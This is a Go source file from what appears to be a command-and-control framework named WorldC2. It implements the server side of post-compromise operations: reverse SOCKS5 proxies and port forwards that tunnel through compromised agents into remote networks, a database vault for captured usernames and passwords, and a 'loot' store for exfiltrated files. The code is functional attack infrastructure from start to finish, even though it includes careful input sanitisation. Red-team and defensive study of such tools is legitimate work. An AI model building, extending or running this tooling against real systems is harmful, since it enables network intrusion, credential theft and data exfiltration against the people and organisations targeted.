package c2

import (
	"database/sql"
	"fmt"
	"io"
	"log"
	"net"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"github.com/Ruby570bocadito/WorldC2/src/go/internal/db"
	"github.com/Ruby570bocadito/WorldC2/src/go/internal/socks"
)

// SOCKS5Manager manages reverse SOCKS5 proxies per agent.
type SOCKS5Manager struct {
	proxies map[string]*socks.Server
	mu      sync.RWMutex
}

// NewSOCKS5Manager creates a new SOCKS5 manager.
func NewSOCKS5Manager() *SOCKS5Manager {
	return &SOCKS5Manager{
		proxies: make(map[string]*socks.Server),
	}
}

// StartProxy starts a SOCKS5 proxy for the given session.
// The proxy listens on localhost:port and tunnels through the agent.
func (m *SOCKS5Manager) StartProxy(sessionID string, port int, dialFn func(target string) (net.Conn, error)) (string, error) {
	m.mu.Lock()
	defer m.mu.Unlock()

	// Check if already running
	if _, exists := m.proxies[sessionID]; exists {
		return "", fmt.Errorf("proxy already running for session %s", sessionID)
	}

	addr := fmt.Sprintf("127.0.0.1:%d", port)
	proxy := socks.New(addr, dialFn)

	if err := proxy.Start(); err != nil {
		return "", fmt.Errorf("start proxy: %w", err)
	}

	m.proxies[sessionID] = proxy
	log.Printf("[SOCKS5] Proxy started for %s on %s", sessionID, addr)
	return addr, nil
}

// StopProxy stops a SOCKS5 proxy for a session.
func (m *SOCKS5Manager) StopProxy(sessionID string) {
	m.mu.Lock()
	defer m.mu.Unlock()

	if proxy, ok := m.proxies[sessionID]; ok {
		proxy.Stop()
		delete(m.proxies, sessionID)
		log.Printf("[SOCKS5] Proxy stopped for %s", sessionID)
	}
}

// ListProxies returns all active proxy mappings.
func (m *SOCKS5Manager) ListProxies() map[string]string {
	m.mu.RLock()
	defer m.mu.RUnlock()

	result := make(map[string]string)
	for id, proxy := range m.proxies {
		result[id] = proxy.Addr()
	}
	return result
}

// --- Credential Vault (SQLite-backed) ---

// Credential represents a captured credential.
type Credential struct {
	ID       string    `json:"id"`
	Username string    `json:"username"`
	Password string    `json:"password"`
	Domain   string    `json:"domain"`
	Host     string    `json:"host"`
	Service  string    `json:"service"`
	Source   string    `json:"source"`
	Captured time.Time `json:"captured"`
	Notes    string    `json:"notes"`
}

// CredentialVault stores captured credentials in SQLite.
type CredentialVault struct {
	db interface {
		AddCredential(c *db.CredentialRecord) error
		ListCredentials() ([]db.CredentialRecord, error)
		SearchCredentials(query string) ([]db.CredentialRecord, error)
		DeleteCredential(id string) error
		CountCredentials() (int, error)
	}
}

// NewCredentialVault creates a new credential vault backed by SQLite.
func NewCredentialVault(database interface {
	AddCredential(c *db.CredentialRecord) error
	ListCredentials() ([]db.CredentialRecord, error)
	SearchCredentials(query string) ([]db.CredentialRecord, error)
	DeleteCredential(id string) error
	CountCredentials() (int, error)
}) *CredentialVault {
	return &CredentialVault{db: database}
}

// Add adds a credential to the vault (persisted to SQLite).
func (v *CredentialVault) Add(c Credential) string {
	id := fmt.Sprintf("cred-%x", time.Now().UnixNano())
	rec := &db.CredentialRecord{
		ID:       id,
		Username: c.Username,
		Password: c.Password,
		Domain:   c.Domain,
		Host:     c.Host,
		Service:  c.Service,
		Source:   c.Source,
		Notes:    c.Notes,
		Captured: time.Now(),
	}
	if err := v.db.AddCredential(rec); err != nil {
		log.Printf("[VAULT] Failed to persist credential: %v", err)
	}
	return id
}

// Search searches credentials by keyword.
func (v *CredentialVault) Search(query string) []Credential {
	records, err := v.db.SearchCredentials(query)
	if err != nil {
		log.Printf("[VAULT] Failed to search credentials: %v", err)
		return []Credential{}
	}

	results := []Credential{}
	for _, r := range records {
		results = append(results, Credential{
			ID:       r.ID,
			Username: r.Username,
			Password: r.Password,
			Domain:   r.Domain,
			Host:     r.Host,
			Service:  r.Service,
			Source:   r.Source,
			Notes:    r.Notes,
			Captured: r.Captured,
		})
	}
	return results
}

// List returns all credentials.
func (v *CredentialVault) List() []Credential {
	records, err := v.db.ListCredentials()
	if err != nil {
		log.Printf("[VAULT] Failed to list credentials: %v", err)
		return []Credential{}
	}

	results := []Credential{}
	for _, r := range records {
		results = append(results, Credential{
			ID:       r.ID,
			Username: r.Username,
			Password: r.Password,
			Domain:   r.Domain,
			Host:     r.Host,
			Service:  r.Service,
			Source:   r.Source,
			Notes:    r.Notes,
			Captured: r.Captured,
		})
	}
	return results
}

// Count returns the number of stored credentials.
func (v *CredentialVault) Count() int {
	count, err := v.db.CountCredentials()
	if err != nil {
		return 0
	}
	return count
}

// --- File Manager ---

// FileManager handles exfiltrated file storage.
type FileManager struct {
	baseDir string
	files   []FileRecord
	mu      sync.RWMutex

	// db (optional) persists every loot record into the file_records table
	// so the listing survives server restarts. nil-safe: all DB calls are
	// skipped when the manager was created without SetDB (tests).
	db *db.DB
}

// SetDB attaches the persistence layer. Must be called before any Store or
// Finalize to have effect on the listing.
func (f *FileManager) SetDB(database *db.DB) { f.db = database }

// FileRecord represents an exfiltrated file entry.
type FileRecord struct {
	ID        string    `json:"id"`
	Filename  string    `json:"filename"`
	SessionID string    `json:"session_id"`
	Module    string    `json:"module"`
	Size      int64     `json:"size"`
	Path      string    `json:"path"`
	Created   time.Time `json:"created"`
}

// NewFileManager creates a new file manager.
func NewFileManager(baseDir string) *FileManager {
	os.MkdirAll(baseDir, 0700)
	return &FileManager{
		baseDir: baseDir,
		files:   make([]FileRecord, 0),
	}
}

// Store saves an exfiltrated file to disk.
func (f *FileManager) Store(sessionID, filename, module string, data []byte) (*FileRecord, error) {
	f.mu.Lock()
	defer f.mu.Unlock()

	// sessionID comes from API requests — reject traversal attempts so the
	// store path can never escape the loot directory.
	saneSession := filepath.Base(sessionID)
	if saneSession == "." || saneSession == ".." || saneSession == "/" ||
		strings.ContainsAny(saneSession, `\..:/`) {
		return nil, fmt.Errorf("invalid session id %q", sessionID)
	}

	id := fmt.Sprintf("file-%x", time.Now().UnixNano())
	safeName := filepath.Base(filename)
	storePath := filepath.Join(f.baseDir, saneSession, safeName)

	os.MkdirAll(filepath.Dir(storePath), 0700)

	if err := os.WriteFile(storePath, data, 0600); err != nil {
		return nil, fmt.Errorf("write file: %w", err)
	}

	rec := FileRecord{
		ID:        id,
		Filename:  safeName,
		SessionID: sessionID,
		Module:    module,
		Size:      int64(len(data)),
		Path:      storePath,
		Created:   time.Now(),
	}

	f.files = append(f.files, rec)
	f.persist(&rec)
	return &rec, nil
}

// persist best-effort writes a record to the DB layer; a failure is logged
// and does not fail the exfil path (the in-memory record is authoritative
// for the current run).
func (f *FileManager) persist(rec *FileRecord) {
	if f.db == nil {
		return
	}
	if err := f.db.InsertFileRecord(&db.FileRecord{
		ID: rec.ID, SessionID: rec.SessionID, Filename: rec.Filename,
		Module: rec.Module, Size: rec.Size, Path: rec.Path, Created: rec.Created,
	}); err != nil {
		log.Printf("[FILES] persist loot record %s: %v", rec.ID, err)
	}
}

// Get returns a file record by ID.
func (f *FileManager) Get(id string) (*FileRecord, error) {
	f.mu.RLock()
	defer f.mu.RUnlock()

	for _, rec := range f.files {
		if rec.ID == id {
			return &rec, nil
		}
	}
	return f.getFromDB(id)
}

// getFromDB resolves a loot record that belongs to a previous run. The file
// body lives in the loot directory (path persisted), so Read keeps working
// across restarts without any in-memory state.
func (f *FileManager) getFromDB(id string) (*FileRecord, error) {
	if f.db == nil {
		return nil, fmt.Errorf("file not found: %s", id)
	}
	records, err := f.db.ListFileRecords()
	if err != nil {
		return nil, fmt.Errorf("file not found: %s", id)
	}
	for _, rec := range records {
		if rec.ID == id {
			out := FileRecord{
				ID: rec.ID, Filename: rec.Filename, SessionID: rec.SessionID,
				Module: rec.Module, Size: rec.Size, Path: rec.Path, Created: rec.Created,
			}
			return &out, nil
		}
	}
	return nil, fmt.Errorf("file not found: %s", id)
}

// Finalize registers an already-complete file (e.g. an exfil chunked upload
// assembled by ExfilAssembler) by moving it from srcPath into the loot store.
// It applies the same session/filename sanitization as Store.
func (f *FileManager) Finalize(sessionID, filename, module, srcPath string, size int64) (*FileRecord, error) {
	f.mu.Lock()
	defer f.mu.Unlock()

	saneSession := filepath.Base(sessionID)
	if saneSession == "." || saneSession == ".." || saneSession == "/" ||
		strings.ContainsAny(saneSession, `\..:/`) {
		return nil, fmt.Errorf("invalid session id %q", sessionID)
	}
	safeName := filepath.Base(filename)
	if safeName == "" || safeName == "." || safeName == ".." {
		return nil, fmt.Errorf("invalid filename %q", filename)
	}

	targetDir := filepath.Join(f.baseDir, saneSession)
	os.MkdirAll(targetDir, 0700)

	storePath := filepath.Join(targetDir, safeName)
	if _, err := os.Stat(storePath); err == nil {
		storePath = filepath.Join(targetDir, fmt.Sprintf("%s-%d", safeName, time.Now().UnixNano()))
	}
	if err := os.Rename(srcPath, storePath); err != nil {
		return nil, fmt.Errorf("finalize move: %w", err)
	}

	rec := FileRecord{
		ID:        fmt.Sprintf("file-%x", time.Now().UnixNano()),
		Filename:  safeName,
		SessionID: sessionID,
		Module:    module,
		Size:      size,
		Path:      storePath,
		Created:   time.Now(),
	}
	f.files = append(f.files, rec)
	f.persist(&rec)
	return &rec, nil
}

// Read reads the contents of a stored file.
func (f *FileManager) Read(id string) ([]byte, *FileRecord, error) {
	rec, err := f.Get(id)
	if err != nil {
		return nil, nil, err
	}
	data, err := os.ReadFile(rec.Path)
	if err != nil {
		return nil, nil, fmt.Errorf("read file: %w", err)
	}
	return data, rec, nil
}

// Delete purges a single loot record everywhere it lives: the blob on disk,
// the in-memory listing of the current run and the persisted file_records
// row. The on-disk removal is guarded against escaping the loot directory
// even if a persisted path was tampered with.
//
// If a DB layer is attached, the row delete is strict: a failure returns an
// error so the operator never believes loot is gone while it would silently
// reappear in the listing after the next restart.
func (f *FileManager) Delete(id string) error {
	rec, err := f.Get(id)
	if err != nil {
		return err
	}

	// Containment guard: resolve both sides and require the stored path to
	// stay inside the loot base directory before touching the filesystem.
	if rec.Path != "" {
		absBase, err := filepath.Abs(f.baseDir)
		if err != nil {
			return fmt.Errorf("resolve loot dir: %w", err)
		}
		absPath, err := filepath.Abs(rec.Path)
		if err != nil {
			return fmt.Errorf("resolve loot path: %w", err)
		}
		rel, err := filepath.Rel(absBase, absPath)
		if err != nil || rel == ".." || strings.HasPrefix(rel, ".."+string(filepath.Separator)) {
			// Tampered or foreign path: drop the records, never the file.
			log.Printf("[FILES] loot path %q escapes base dir %q — removing records only", absPath, absBase)
			f.removeMemory(id)
			f.removeDB(id)
			return nil
		}
		if err := os.Remove(absPath); err != nil && !os.IsNotExist(err) {
			return fmt.Errorf("remove loot file: %w", err)
		}
	}

	f.removeMemory(id)
	return f.removeDB(id)
}

// removeMemory drops the record from the current-run listing.
func (f *FileManager) removeMemory(id string) {
	f.mu.Lock()
	defer f.mu.Unlock()
	for i, rec := range f.files {
		if rec.ID == id {
			f.files = append(f.files[:i], f.files[i+1:]...)
			break
		}
	}
}

// PurgeAll removes every loot record and its blob: the in-memory listing of
// the current run and the persisted rows of previous runs. It reuses Delete
// per record so each removal keeps the same containment guards (tampered or
// foreign paths only drop records, never the referenced file) and the same
// strict DB semantics. Returns the number of records purged; the first hard
// error (e.g. a blob the OS refuses to remove) aborts the sweep so the
// operator learns about it instead of silently losing loot view consistency.
func (f *FileManager) PurgeAll() (int, error) {
	records := f.List()
	purged := 0
	for _, rec := range records {
		if err := f.Delete(rec.ID); err != nil {
			return purged, fmt.Errorf("purge %s: %w", rec.ID, err)
		}
		purged++
	}
	return purged, nil
}

// removeDB drops the persisted row; a missing row counts as success.
func (f *FileManager) removeDB(id string) error {
	if f.db == nil {
		return nil
	}
	if err := f.db.DeleteFileRecord(id); err != nil && err != sql.ErrNoRows {
		return fmt.Errorf("delete loot record: %w", err)
	}
	return nil
}

// List returns all file records: this run's in-memory entries plus the
// persisted rows from previous runs (deduplicated by ID).
func (f *FileManager) List() []FileRecord {
	f.mu.RLock()
	inMemory := make([]FileRecord, len(f.files))
	copy(inMemory, f.files)
	f.mu.RUnlock()

	result := make([]FileRecord, 0, len(inMemory))
	seen := make(map[string]bool, len(inMemory))
	for _, rec := range inMemory {
		result = append(result, rec)
		seen[rec.ID] = true
	}

	if f.db != nil {
		if persisted, err := f.db.ListFileRecords(); err == nil {
			for _, rec := range persisted {
				if !seen[rec.ID] {
					result = append(result, FileRecord{
						ID: rec.ID, Filename: rec.Filename, SessionID: rec.SessionID,
						Module: rec.Module, Size: rec.Size, Path: rec.Path, Created: rec.Created,
					})
					seen[rec.ID] = true
				}
			}
		} else {
			log.Printf("[FILES] list persisted loot: %v", err)
		}
	}
	return result
}

// --- Port Forward Manager ---

// PortFwdManager handles port forwarding (local → C2 → agent → remote).
type PortFwdManager struct {
	forwards map[string]*PortForward
	mu       sync.RWMutex
}

// PortForward represents a single port forward rule.
type PortForward struct {
	ID         string
	LocalPort  int
	RemoteHost string
	RemotePort int
	SessionID  string
	listener   net.Listener
	// running is read by the accept-loop goroutine and written by Stop(),
	// potentially from a different goroutine than the accept-loop — hence
	// the atomic. A plain bool raced (go test -race) between the two.
	running atomic.Bool
}

// NewPortFwdManager creates a new port forwarding manager.
func NewPortFwdManager() *PortFwdManager {
	return &PortFwdManager{
		forwards: make(map[string]*PortForward),
	}
}

// Start starts a local port forward that tunnels through an agent.
func (m *PortFwdManager) Start(sessionID string, localPort int, remoteHost string, remotePort int, dialFn func(target string) (net.Conn, error)) (*PortForward, error) {
	m.mu.Lock()
	defer m.mu.Unlock()

	id := fmt.Sprintf("fwd-%x", time.Now().UnixNano())

	fwd := &PortForward{
		ID:         id,
		LocalPort:  localPort,
		RemoteHost: remoteHost,
		RemotePort: remotePort,
		SessionID:  sessionID,
	}

	listener, err := net.Listen("tcp", fmt.Sprintf("127.0.0.1:%d", localPort))
	if err != nil {
		return nil, fmt.Errorf("listen: %w", err)
	}

	fwd.listener = listener
	fwd.running.Store(true)
	m.forwards[id] = fwd

	target := fmt.Sprintf("%s:%d", remoteHost, remotePort)

	go func() {
		for fwd.running.Load() {
			conn, err := listener.Accept()
			if err != nil {
				if !fwd.running.Load() {
					return
				}
				// Transient accept error while still running:
				// back off instead of spinning the CPU, and
				// re-check running afterwards.
				time.Sleep(100 * time.Millisecond)
				continue
			}

			go func(client net.Conn) {
				defer client.Close()

				targetConn, err := dialFn(target)
				if err != nil {
					log.Printf("[PORTFWD] Failed to dial target %s: %v", target, err)
					return
				}
				defer targetConn.Close()

				var wg sync.WaitGroup
				wg.Add(2)
				go func() { defer wg.Done(); io.Copy(targetConn, client) }()
				go func() { defer wg.Done(); io.Copy(client, targetConn) }()
				wg.Wait()
			}(conn)
		}
	}()

	log.Printf("[PORTFWD] %s → %s (via %s)", fmt.Sprintf("127.0.0.1:%d", localPort), target, sessionID)
	return fwd, nil
}

// Stop stops a port forward.
func (m *PortFwdManager) Stop(id string) error {
	m.mu.Lock()
	defer m.mu.Unlock()

	fwd, ok := m.forwards[id]
	if !ok {
		return fmt.Errorf("forward not found: %s", id)
	}

	fwd.running.Store(false)
	fwd.listener.Close()
	delete(m.forwards, id)
	return nil
}

// List returns all active port forwards.
func (m *PortFwdManager) List() []PortForward {
	m.mu.RLock()
	defer m.mu.RUnlock()

	result := make([]PortForward, 0, len(m.forwards))
	for _, fwd := range m.forwards {
		// Copy only the data fields: PortForward now embeds an
		// atomic.Bool (noCopy) and a listener that must not be
		// shallow-copied into the snapshot.
		result = append(result, PortForward{
			ID:         fwd.ID,
			LocalPort:  fwd.LocalPort,
			RemoteHost: fwd.RemoteHost,
			RemotePort: fwd.RemotePort,
			SessionID:  fwd.SessionID,
		})
	}
	return result
}
